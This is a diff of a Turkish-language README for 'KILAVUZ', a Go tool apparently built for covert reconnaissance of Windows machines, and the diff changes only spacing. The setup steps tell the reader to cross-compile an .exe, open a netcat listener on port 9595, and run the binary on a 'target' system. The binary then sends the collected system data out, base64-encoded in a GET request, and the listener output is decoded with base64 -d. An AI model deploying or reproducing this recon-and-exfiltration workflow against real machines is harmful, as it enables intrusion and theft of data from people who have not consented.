@@ -9,22 +9,28 @@ KILAVUZ, Windows işletim sistemlerinde sistem keşfi (recon) yapmak ve elde edi
 * **Hafif Mimari:** Bağımlılık gerektirmez, GoLang'in standart kütüphaneleri ile derlenir.
 
 ## Kurulum ve Kullanım
-1.Repoyu klonlayın:
+1.Repoyu klonlayın:  
+
 git clone https://github.com/ulvi0193/KILAVUZ-v1.0
 
-2.Proje dizinine geçiş yapın:
+2.Proje dizinine geçiş yapın:  
+
 cd KILAVUZ-v1.0
 
-3.Aracı Windows için derleyin:
+3.Aracı Windows için derleyin:  
+
 GOOS=windows GOARCH=amd64 go build -o kilavuz.exe main.go
 
-4.Dinleyiciyi başlatın:
+4.Dinleyiciyi başlatın:  
+
 nc -lvnp 9595
 
-5.Test edin:
+5.Test edin:   
+
 Oluşan .exe dosyasını hedef Windows sisteminde çalıştırdığınız an, Netcat ekranına GET /rapor?veri=[BASE64_METNİ] şeklinde bir istek düşecektir.
 
-6.Veriyi decode edin:
+6.Veriyi decode edin:  
+
 veri= kısmından sonrasını kopyalayın ve terminalinizde şu komutla veriyi çözün:
 
 echo "KOPYALANAN_BASE64_METNİ" | base64 -d
